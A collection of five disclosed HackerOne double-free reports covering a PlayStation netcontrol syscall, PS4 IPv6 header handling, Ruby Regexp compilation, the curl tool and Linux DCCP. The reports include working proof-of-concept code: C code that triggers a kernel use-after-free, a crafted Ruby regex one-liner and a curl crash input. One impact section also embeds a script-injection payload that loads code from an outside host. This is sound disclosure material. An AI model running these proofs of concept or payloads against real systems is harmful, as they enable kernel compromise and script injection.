# Double Free

_5 reports — High/Critical, disclosed_

### [Double fdrop on a socket through sys_netcontrol](https://hackerone.com/reports/3320669)

- **Report ID:** `3320669`
- **Severity:** High
- **Weakness:** Double Free
- **Program:** PlayStation
- **Reporter:** @slidybat
- **Bounty:** 10000 usd
- **Disclosed:** 2026-05-01T01:41:40.533Z
- **CVE(s):** -

**Summary (team):**

## Summary:
The `netcontrol` syscall has the following prototype:
```
int netcontrol(int if_index, int cmd, void* buf, size_t buflen)
```

The netcontrol handler for a cmd value of `0x20000003` takes a socket fd value as input and stores the socket pointer/fd to a netevent struct.

The code for adding a socket to a netevent struct looks like this:
```c++
int
kern_netevent_set_queue(struct thread *td, struct ifnet *ifp, int *user_buf)
{
    int res;
    struct file *fp;
    int socket_fd = *user_buf;
    int should_drop = 0;
    ...

    res = getsock_cap(td, socket_fd, cap_rights_init(&rights, 0), &fp, NULL, NULL);
    if (res != 0)
        return res;

    res = bnet_netevent_set_queue(td, ifp, fp->f_data, user_buf, &should_drop);
    if (should_drop || res != 0)
        fdrop(fp, td);

    return res;
}

int
bnet_netevent_set_queue(struct thread *td, struct ifnet *ifp, struct socket *so, int *user_buf, int *should_drop)
{
    ...
    int socket_fd = *user_buf;
    struct netevent* ne;
    ...
    // [snipped code that finds available netevent struct, either from ifp or global]
    ...
    
    ne->flags |= 1; // Mark netevent as being "filled"
    ne->socket = so;
    ne->socket_fd = socket_fd;
    so->so_netevent = ne;

    ...
}
```

Note that a reference to the socket is taken through `getsock_cap()`, and as long as no error occurs, that reference is held and owned by the netevent.

The socket can also be removed from a netevent through netcontrol cmd `0x20000007`.
The code for doing so looks like this:

```c++
int
kern_netevent_clear_queue(struct thread *td, struct ifnet *ifp, int *user_buf)
{
    int res;
    struct file *fp;
    int socket_fd = *user_buf;
    ...

    res = getsock_cap(td, socket_fd, cap_rights_init(&rights, 0), &fp, NULL, NULL);
    if (res != 0)
        return res;

    res = bnet_netevent_clear_queue(td, ifp, fp->f_data, user_buf);
    if (res == 0)
        fdrop(fp, td); // Drop ref that was held by netevent
    fdrop(fp, td); // Drop ref from getsock_cap() call above

    return res;
}

int
bnet_netevent_clear_queue(struct thread *td, struct ifnet *ifp, int *user_buf)
{
    int socket_fd = *user_buf;
    struct netevent* ne;
    
    // Find netevent that has matching socket fd
    for (int i = 0; i < 3; i++) {
        ne = ifp ? (&ifp->if_netevent[i]) : &g_common_ev[i];
        if ((ne->flags & 1) != 0 || ne->socket_fd != socket_fd)
            continue;
        bzero(ne, sizeof(*ne));
        return 0;
    }

    return 5;
}
```

This will clear the socket pointer and call `fdrop()` to release the reference that was held when the socket was initially set.

The bug here is that when clearing a socket from a netevent, the comparison between the stored socket and the input socket is done using the fd.
However, the fd is not static and can be changed by the user to point to a different socket.
If this is done, an extra `fdrop()` is called on a socket that never had that reference taken, and the reference from the original socket is leaked.

## Steps To Reproduce:

  1. Create a sockets `s1`
  2. Add `s1` to netevent using `netcontrol()` syscall with cmd 0x20000003
  3. Close `s1` and create a new socket `s2`. The fd of both sockets should be the same.
  4. Remove `s2` from netevent using `netcontrol()` syscall with cmd 0x20000007
  5. `s2` will have `fdrop()` called on it twice, despite it never having been actually added to netevent. A reference to the original `s1` file will also be leaked.

C code:
```c++
#define NETCONTROL_NETEVENT_SET_QUEUE 0x20000003
#define NETCONTROL_NETEVENT_CLEAR_QUEUE 0x20000007

void main()
{
    int64_t s1 = socket(AF_INET, SOCK_STREAM, 0); // s1 refcnt = 1

    // Add s1 to netevent
    netcontrol(0, NETCONTROL_NETEVENT_SET_QUEUE, &s1, sizeof(s1)); // s1 refcnt = 2

    // Close s1 and open new socket s2
    // fd values are predictable, so s2 fd should be same as s1 fd
    close(s1); // s1 refcnt = 1
    int64_t s2 = socket(AF_INET, SOCK_STREAM, 0); // s2 refcnt = 1

    // Remove s2 from netevent (will cause double fdrop on file of s2)
    netcontrol(0, NETCONTROL_NETEVENT_CLEAR_QUEUE, &s2, sizeof(s2)); // s2 refcnt = 0, s1 refcnt = 1

    // At this stage, the backing file/socket for s2 has been freed, but we still have
    // a reference to it in the fdtable.
    //
    // Triggering call to fget() will result in a hang, due to fget() code not handling
    // refcnt of 0 well.
    //
    // On PS4, calling fcntl(F_SETFL) will cause file to get freed again, since that
    // calls fhold()/fdrop() directly without going through fget().
    // Doing this enough times will cause a crash/panic at some point.
    //
    // On PS5, fcntl(F_SETFL) will call fget() which should hang.
    for (int i = 0; i < 100; i++) {
        fcntl(s2, F_SETFL, 0);
    }
}
```

## Impact

The double put of a file pointer can lead to a use-after-free, due to the file being freed while references to it still exist.
Can be used by an attacker for memory corruption, potentially leading to kernel code execution.

---

### [CVE-2022-28738: Double free in Regexp compilation](https://hackerone.com/reports/1549636)

- **Report ID:** `1549636`
- **Severity:** High
- **Weakness:** Double Free
- **Program:** Internet Bug Bounty
- **Reporter:** @piao
- **Bounty:** 4000 usd
- **Disclosed:** 2022-05-28T18:18:28.200Z
- **CVE(s):** CVE-2022-28738

**Vulnerability Information:**

Due to a bug in the Regexp compilation process, creating a Regexp object with a crafted source string could cause the same memory to be freed twice. This is known as a “double free” vulnerability. Note that, in general, it is considered unsafe to create and use a Regexp object generated from untrusted input. In this case, however, following a comprehensive assessment, we treat this issue as a vulnerability.

poc:
```
ruby -e '/(\\x15\\x17\\xE2\\xF5\\xF5\\xF5\\xC2\\x04\\x08J,\\x00\\xD0\\x00\\x00(?(1)\\xF5\\xF5\\xF5\\xD7\\xF5\\xF5\\xF5\\x87\\x04\\xFA555\\xBEJ,\\x18FF\\x15\\xFF|\\x03\\x01\\x00\\x01\\x00\\x00\\x8F\r|)44\\x00\\x8F\r|)+/m'
```

## Impact

may lead to a RCE attack cooperate with marshal.load

**Summary (team):**

A double-free vulnerability is discovered in Regexp compilation. This vulnerability has been assigned the CVE identifier CVE-2022-28738. We strongly recommend upgrading Ruby.

Details
Due to a bug in the Regexp compilation process, creating a Regexp object with a crafted source string could cause the same memory to be freed twice. This is known as a “double free” vulnerability. Note that, in general, it is considered unsafe to create and use a Regexp object generated from untrusted input. In this case, however, following a comprehensive assessment, we treat this issue as a vulnerability.

Please update Ruby to 3.0.4, or 3.1.2.

Affected versions
ruby 3.0.3 or prior
ruby 3.1.1 or prior
Note that ruby 2.6 series and 2.7 series are not affected.

Credits
Thanks to piao for discovering this issue.

History
Originally published at 2022-04-12 12:00:00 (UTC)

https://www.ruby-lang.org/en/news/2022/04/12/double-free-in-regexp-compilation-cve-2022-28738/

---

### [SOCK_RAW sockets reachable from Webkit process allows triggering double free in IP6_EXTHDR_CHECK](https://hackerone.com/reports/943231)

- **Report ID:** `943231`
- **Severity:** High
- **Weakness:** Double Free
- **Program:** PlayStation
- **Reporter:** @theflow0
- **Bounty:** 10000 usd
- **Disclosed:** 2021-01-12T20:33:19.193Z
- **CVE(s):** -

**Summary (team):**

## Summary

Memory corruption can be achieved by sending fragmented IPv6 packets to loopback interface due to poor and inconsistent use of `IP6_EXTHDR_CHECK`.

The macro `IP6_EXTHDR_CHECK` can free the mbuf if the packet is sent to loopback interface. This fact is not considered in `dest6_input()`, `frag6_input()` and more. For example in `dest6_input()`, the double pointer is not updated:
```
int
dest6_input(struct mbuf **mp, int *offp, int proto)
{
	struct mbuf *m = *mp;
	...
	IP6_EXTHDR_CHECK(m, off, sizeof(*dstopts), return IPPROTO_DONE);
	...
	*offp = off;
	return dstopts->ip6d_nxt;
}
```

Hence, when parsing next headers, the mbuf can be free'd once again, leading to a double free which behaves like a use-after-free when we allocate mbuf's again.

Normally, this path would not be triggerable, because sending to loopback interface requires SOCK_RAW root privileges. **However, for some reason on the PS4 SOCK_RAW sockets can be opened in Webkit process!**

Attached is `poc.c` which must run with root privileges on a FreeBSD 9 machine. It demonstrates being able to escalate privileges to kernel.
Attached is also `ps4.c` which is slightly adjusted to work on the PS4 (you'd need to add includes etc to be able to compile it with your official sdk, I compiled it with a custom framework).

The reliability of `poc.c` is very high, around 80%, whereas`ps4.c` is not very high, I guess around 20%.

## Impact

- In conjunction with a WebKit exploit, a fully chained remote attack can be achieved.
- It is possible to steal/manipulate user data.
- Dump and run pirated games.

---

### [Invalid write (or double free) triggers curl command line tool crash](https://hackerone.com/reports/875775)

- **Report ID:** `875775`
- **Severity:** High
- **Weakness:** Double Free
- **Program:** curl
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2020-05-18T06:23:01.976Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Whilst fuzzing libcurl built from `git commit a158a09`, a crash triggered by an invalid write (or maybe a double/invalid  free) was found. 

## Steps To Reproduce:

Run:
`echo "LVQvCnVyIDA=" | base64 -d > test0000`
`./curl --verbose -q -K test0000 file:///dev/null`

Stack:

```
valgrind -q src/curl --verbose -q -K ~/curl/tmp/out/crashes/test0001 file:///dev/null
==12371== Invalid free() / delete / delete[] / realloc()
==12371==    at 0x48369AB: free (vg_replace_malloc.c:530)
==12371==    by 0x128C84: add_file_name_to_url (in /root/curl-no-asan/src/curl)
==12371==    by 0x1259EF: create_transfer (in /root/curl-no-asan/src/curl)
==12371==    by 0x1285DC: operate (in /root/curl-no-asan/src/curl)
==12371==    by 0x119828: main (in /root/curl-no-asan/src/curl)
==12371==  Address 0x192f1a is in a r-- mapped file /root/curl-no-asan/src/curl segment
==12371==
*   Trying 0.0.0.0:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* connect to 0.0.0.0 port 80 failed: Connection refused
* Failed to connect to 0 port 80: Connection refused
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
* Closing connection 0
curl: (7) Failed to connect to 0 port 80: Connection refused
* Closing connection 1
```

If we switch over to ASAN with AFL's libdislocator.so loaded:
```
LD_PRELOAD=/root/aflplusplus/libdislocator.so ../../../src/curl -q --verbose -K test0001 file:///dev/null
AddressSanitizer:DEADLYSIGNAL
=================================================================
==12389==ERROR: AddressSanitizer: SEGV on unknown address 0x00000074b590 (pc 0x0000004267f4 bp 0x000000000000 sp 0x7fffffffcdd0 T0)
==12389==The signal is caused by a WRITE memory access.
    #0 0x4267f4 in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType) (/root/curl/src/curl+0x4267f4)
    #1 0x49daa1 in free (/root/curl/src/curl+0x49daa1)
    #2 0x511d0d in add_file_name_to_url /root/curl/src/tool_operhlp.c:117:7
    #3 0x50281e in single_transfer /root/curl/src/tool_operate.c:1116:24
    #4 0x4fe95b in transfer_per_config /root/curl/src/tool_operate.c:2438:14
    #5 0x4fe95b in create_transfer /root/curl/src/tool_operate.c:2454:14
    #6 0x4f9de6 in serial_transfers /root/curl/src/tool_operate.c:2273:12
    #7 0x4f9de6 in run_all_transfers /root/curl/src/tool_operate.c:2479:16
    #8 0x4f99d3 in operate /root/curl/src/tool_operate.c:2594:18
    #9 0x4f8437 in main /root/curl/src/tool_main.c:323:14
    #10 0x7ffff762309a in __libc_start_main /build/glibc-vjB4T1/glibc-2.28/csu/../csu/libc-start.c:308:16
    #11 0x425559 in _start (/root/curl/src/curl+0x425559)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV (/root/curl/src/curl+0x4267f4) in __asan::Allocator::Deallocate(void*, unsigned long, unsigned long, __sanitizer::BufferedStackTrace*, __asan::AllocType)
==12389==ABORTING
*** [AFL] bad allocator canary on free() ***
Stack dump:
0.      Program arguments: /usr/bin/llvm-symbolizer-10 --inlining=true --default-arch=x86_64
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys15PrintStackTraceERNS_11raw_ostreamE+0x1f)[0x7ffff4227a9f]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm3sys17RunSignalHandlersEv+0x50)[0x7ffff4225d60]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xa50065)[0x7ffff4228065]
/lib/x86_64-linux-gnu/libpthread.so.0(+0x12730)[0x7ffff37c9730]
/lib/x86_64-linux-gnu/libc.so.6(gsignal+0x10b)[0x7ffff330a7bb]
/lib/x86_64-linux-gnu/libc.so.6(abort+0x121)[0x7ffff32f5535]
/root/aflplusplus/libdislocator.so(free+0x1e1)[0x7ffff7fc9bb1]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm12PassRegistryD1Ev+0x1c)[0x7ffff435d1ec]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(+0xb85c0e)[0x7ffff435dc0e]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm13llvm_shutdownEv+0xa9)[0x7ffff41bf329]
/lib/x86_64-linux-gnu/libLLVM-10.so.1(_ZN4llvm8InitLLVMD1Ev+0x10)[0x7ffff419f7a0]
/usr/bin/llvm-symbolizer-10[0x406c70]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xeb)[0x7ffff32f709b]
/usr/bin/llvm-symbolizer-10[0x405eda]
```

## Impact

Denial of service, information disclosure, software crash, glitter everywhere"><script src=//xss.mx></script>, the Kool-Aid<x=" Man crashing through walls, dogs and cats living together, mass hysteria! Just kidding. It's probably limited only to the tool which means the impact is limited, I know the routine. (:

---

### [Linux kernel: CVE-2017-6074: DCCP double-free vulnerability](https://hackerone.com/reports/347282)

- **Report ID:** `347282`
- **Severity:** High
- **Weakness:** Double Free
- **Program:** Internet Bug Bounty
- **Reporter:** @xairy
- **Bounty:** - usd
- **Disclosed:** 2019-08-27T21:07:09.510Z
- **CVE(s):** CVE-2017-6074

**Vulnerability Information:**

Hi!

CVE-2017-6074 [1]  is a double-free vulnerability I found in the Linux kernel. It can be exploited to gain
kernel code execution from an unprivileged processes. The kernel needs to be built with CONFIG_IP_DCCP for the vulnerability to be present. A lot of modern distributions enable this option by default.

Fixed on Feb 17, 2017 [2]. The oldest version that I checked is 2.6.18 (Sep 2006), which is vulnerable. However, the bug was introduced before that, probably in the first release with DCCP support (2.6.14, Oct 2005).

I initially reported this vulnerability to security@kernel.org following the coordinated disclosure process. The timeline and more details about the vulnerability can be found in my announcement on oss-security [3]. A proof-of-concept exploit for the 4.4.0-62-generic #83-Ubuntu kernel can be found here [4, 5].

The reason I'm reporting this now is that I just saw a similar bug [6] in the Windows kernel reported to this program and that reminded me of a Sandbox Escape program that used to be on HackerOne. I thought it makes sense to see if IBB would come back to considering this kind of bugs eligible for a bounty.

Thanks!

[1] https://nvd.nist.gov/vuln/detail/CVE-2017-6074

[2] https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=5edabca9d4cff7f1f2b68f0bac55ef99d9798ba4

[3] http://seclists.org/oss-sec/2017/q1/471

[4] https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074

[5] http://seclists.org/oss-sec/2017/q1/503

[6] https://hackerone.com/reports/48100

## Impact

This vulnerability allows a local attacker to elevate privileges to root on a machine with vulnerable Linux kernel version.

---
